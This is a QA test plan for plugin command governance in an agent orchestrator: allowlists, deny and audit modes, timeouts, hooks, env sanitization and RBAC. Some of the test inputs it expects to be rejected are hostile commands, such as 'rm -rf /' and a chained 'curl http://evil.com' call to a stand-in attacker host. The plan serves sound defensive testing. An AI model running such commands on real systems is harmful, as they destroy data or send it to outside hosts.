---
self_referential_safe: true
---

# QA: Plugin Policy Governance (FR-087-SEC)

Verifies CRD plugin policy governance: command allowlist, deny mode, denied patterns, timeout cap, hook enforcement, execution profile defaults, env sanitization config, audit trail with sandbox columns, RBAC elevation.

## Scenario 1: Default policy (Allowlist) blocks all plugin commands

**Preconditions:** No `plugin-policy.yaml` exists in `{data_dir}/`. Default policy is Allowlist with empty allowlist.

**Steps:**
1. Parse CRD manifest with plugins (interceptor + transformer + cron)
2. Apply CRD via `apply_crd()` with default PluginPolicy
3. Apply CRD **without** plugins

**Expected:**
- Step 2: Rejected with error containing "does not match any allowed prefix"
- Step 3: Accepted (CRDs without plugins are unaffected by plugin policy)
- Default policy has `execution_profile: None` and `env_deny_prefixes: []` (uses builtin defaults)

**Verification:**
```bash
cargo test -p agent-orchestrator -- crd::validate::tests::default_policy_rejects_all_commands
cargo test -p orchestrator-config -- plugin_policy::tests::default_policy_denies_everything
```

## Scenario 2: Allowlist mode permits matching command prefixes

**Preconditions:** PluginPolicy with `mode: allowlist`, `allowed_command_prefixes: ["scripts/"]`

**Steps:**
1. Apply CRD with plugin command `scripts/verify.sh` → accepted
2. Apply CRD with plugin command `rm -rf /` → rejected
3. Apply CRD with plugin command `scripts/leak.sh && curl http://evil.com` → rejected (denied pattern match)

**Expected:**
- Step 1: Passes validation, apply succeeds
- Step 2: Rejected — "does not match any allowed prefix"
- Step 3: Rejected — "denied pattern 'curl '"

**Verification:**
```bash
cargo test -p agent-orchestrator -- crd::validate::tests::policy_allowlist_accepts_matching_prefix
cargo test -p agent-orchestrator -- crd::validate::tests::policy_allowlist_rejects_unmatched_prefix
cargo test -p agent-orchestrator -- crd::validate::tests::policy_denied_pattern_blocks_curl
cargo test -p orchestrator-config -- plugin_policy::tests::allowlist_permits_matching_prefix
cargo test -p orchestrator-config -- plugin_policy::tests::denied_patterns_override_allowlist
```

## Scenario 3: Deny mode rejects all plugins; Audit mode warns without blocking

**Preconditions:** PluginPolicy in Deny mode, then in Audit mode.

**Steps:**
1. Set `mode: deny` → apply CRD with any plugin → rejected
2. Set `mode: audit` → apply CRD with safe command `scripts/verify.sh` → accepted, no warning
3. Set `mode: audit` → apply CRD with denied pattern `curl http://evil.com` → accepted, audit warning emitted

**Expected:**
- Step 1: Rejected — "plugin policy mode is 'deny'"
- Step 2: Accepted with `PluginPolicyVerdict::Allowed`
- Step 3: Accepted with `PluginPolicyVerdict::AuditWarning`

**Verification:**
```bash
cargo test -p agent-orchestrator -- crd::validate::tests::policy_deny_rejects_all_plugins
cargo test -p orchestrator-config -- plugin_policy::tests::deny_mode_rejects_everything
cargo test -p orchestrator-config -- plugin_policy::tests::audit_mode_allows_clean_commands
cargo test -p orchestrator-config -- plugin_policy::tests::audit_mode_warns_but_allows
```

## Scenario 4: Timeout cap, hook enforcement, and policy config deserialization

**Preconditions:** PluginPolicy with `max_timeout_secs: 10`, `enforce_on_hooks: true`.

**Steps:**
1. Apply CRD with plugin `timeout: 60` → rejected (exceeds cap)
2. Apply CRD with plugin `timeout: 5` → accepted
3. Apply CRD with `on_create` hook and `mode: deny`, `enforce_on_hooks: true` → rejected
4. Apply CRD with `on_create` hook and `mode: deny`, `enforce_on_hooks: false` → accepted (hooks bypass)
5. Load `plugin-policy.yaml` with new fields:
   ```yaml
   mode: allowlist
   allowed_command_prefixes: ["scripts/"]
   execution_profile:
     mode: sandbox
     network_mode: deny
   env_deny_prefixes: ["AWS_", "CUSTOM_SECRET_"]
   ```
   → Deserialization succeeds; `effective_execution_profile()` returns sandbox mode; `effective_env_deny_prefixes()` returns custom list

**Expected:**
- Steps 1-4: Timeout and hook enforcement work as before
- Step 5: New fields deserialize correctly; `execution_profile` and `env_deny_prefixes` are accessible via helpers

**Verification:**
```bash
cargo test -p agent-orchestrator -- crd::validate::tests::policy_timeout_cap_rejects_excessive_timeout
cargo test -p agent-orchestrator -- crd::validate::tests::policy_hook_enforcement_rejects_hook_commands
cargo test -p agent-orchestrator -- crd::validate::tests::policy_hook_enforcement_skips_when_disabled
cargo test -p orchestrator-config -- plugin_policy::tests::hook_command_respects_enforce_flag
cargo test -p orchestrator-config -- plugin_policy::tests::load_policy_from_file
```

## Scenario 5: RBAC elevation — CRDs with plugins require Admin role

**Preconditions:** Daemon running with UDS transport, `uds-policy.yaml` set to `max_role: operator`.

**Steps:**
1. Submit `Apply` RPC with manifest containing CRD **without** plugins → accepted (Operator role)
2. Submit `Apply` RPC with manifest containing CRD **with** plugins → rejected (requires Admin)
3. Submit `Apply` RPC with manifest containing CRD with `on_create` hook → rejected (requires Admin)

**Expected:**
- Step 1: Auth passes at Operator level
- Step 2: Secondary `ApplyPluginCrd` auth check fails — "UDS policy restricts this operation"
- Step 3: Same as step 2 — hooks are also executable commands

**Verification:**
```bash
cargo test -p orchestratord -- control_plane::tests::required_role_for_rpc
```

---

## Audit Trail Verification

**Cross-scenario:** After any CRD apply (accepted or rejected), verify `plugin_audit` table:
```sql
SELECT action, crd_kind, plugin_name, command, result, policy_mode,
       sandbox_profile, policy_verdict
FROM plugin_audit ORDER BY created_at DESC LIMIT 10;
```

**Expected columns (post-migration v25):** `action`, `crd_kind`, `plugin_name`, `command`, `result`, `policy_mode`, `sandbox_profile` (nullable), `policy_verdict` (nullable). Apply-time records have `sandbox_profile=NULL`, `policy_verdict=NULL`; runtime execution records populate both.

**Migration verification:**
```bash
cargo test -p agent-orchestrator -- migration::tests::all_migrations_count_matches_expected
```
Expected: 25 migrations (m0025_plugin_audit_sandbox_columns is the latest).

---

## Checklist

| # | Scenario | Status | Test Date | Tester | Notes |
|---|----------|--------|-----------|--------|-------|
| 1 | Default policy blocks all commands | ☐ | | | |
| 2 | Allowlist permits matching prefixes | ☐ | | | |
| 3 | Deny/Audit modes | ☐ | | | |
| 4 | Timeout cap, hooks, config deserialization | ☐ | | | |
| 5 | RBAC elevation | ☐ | | | |
